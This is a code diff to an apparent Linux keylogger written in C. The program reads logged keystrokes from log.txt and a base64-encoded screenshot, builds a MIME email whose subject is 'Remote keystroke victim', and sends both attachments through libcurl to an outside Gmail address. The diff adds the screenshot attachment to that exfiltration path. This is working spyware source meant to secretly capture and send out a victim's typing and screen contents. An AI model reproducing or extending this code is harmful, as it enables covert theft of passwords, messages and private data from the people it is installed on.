@@ -18,15 +18,19 @@ char * payload_text =
   "MIME-Version: 1.0\r\n"
   "From: doi2xuyenviet7@gmail.com\r\n"
   "To: nguyenngocdoanh1998@gmail.com\r\n"
-  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@rfcpedant.example.org>\r\n"
   "Subject: Remote keystroke victim !!!\r\n\r\n"
   "--===============3165153444163065104==\r\n"
   "Content-Type: application/octet-stream\r\n"
   "MIME-Version: 1.0\r\n"
   "Content-Transfer-Encoding: base64\r\n"
   "Content-Disposition: attachment; filename= log.txt\r\n\r\n";
-  //"UF1bVVBdW1VQXVtVUF1bUklHSFRdW1JJR0hUXVtSSUdIVF1bVVBdW0RPV05dW0RPV05dW2VuZF1bRU5URVJdW1NQQUNFXVtTUEFDRV0nW1NISUZUXVxyXG4nW1NISUZUXVtET1dOXVtET1dOXVtET1dOXVtET1c="
-  //"\r\n--===============3165153444163065104==--\r\n.\r\n";
+
+char * payload_image =
+  "\r\n--===============3165153444163065104==\r\n"
+  "Content-Type: image/jpeg\r\n"
+  "MIME-Version: 1.0\r\n"
+  "Content-Transfer-Encoding: base64\r\n"
+  "Content-ID: <1>\r\n\r\n";
 
 char * boundary =  "\r\n--===============3165153444163065104==--\r\n.\r\n";
 
@@ -277,12 +281,13 @@ static size_t payload_source(char *ptr, size_t size, size_t nmemb, void *userp)
   }
 
   data = &payload_text[upload_ctx->bytes_read];
+  printf("%s\n", data);
+
   if(data) {
     size_t len = strlen(data);
     if(room < len)
       len = room;
     memcpy(ptr, data, len);
-    printf("%s\n", data);
     upload_ctx->bytes_read += len;
 
     return len;
@@ -292,7 +297,6 @@ static size_t payload_source(char *ptr, size_t size, size_t nmemb, void *userp)
 }
 
 int send_email(){
-    //system("scrot -o /home/doanhnn/linux/keylogger/C/screen.png");
     CURL *curl;
     CURLcode res = CURLE_OK;
     struct curl_slist *recipients = NULL;
@@ -345,16 +349,22 @@ int main() {
     //find_event_file_path();
     //read_event_kdb();
 
-    FILE *fp;
-    char *buff = malloc(sizeof(char) * 1024);
-    fp = fopen("log.txt", "r");
-    fscanf(fp, "%s", buff);
+    FILE *fp_text;
+    char *buff = malloc(sizeof(char) *1024);
+    fp_text = fopen("log.txt", "r");
+    fscanf(fp_text, "%s", buff);
     char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
-    char * tmp = payload_text;
-    payload_text = concat_string(tmp, enc, boundary);
-    printf("%s\n", payload_text);
+    char * tmp = concat_string(payload_text, enc, payload_image);
+    //printf("%s\n", payload_text);
+    char *buff1 = malloc(sizeof(char)*1024*1024);
+    FILE *fp_image = fopen("screen_enc.txt", "r");
+    fscanf(fp_image, "%s", buff1);
+    //printf("%s\n", buff1);
+    payload_text = concat_string(tmp, buff1, boundary);
+    //printf("%d\n", strlen(payload_text));
     send_email();
-    free(buff);
-    free(enc);
+    //free(buff);free(buff1);
+    //free(tmp);free(tmp1);
+    //free(enc);
     return 0;
 }
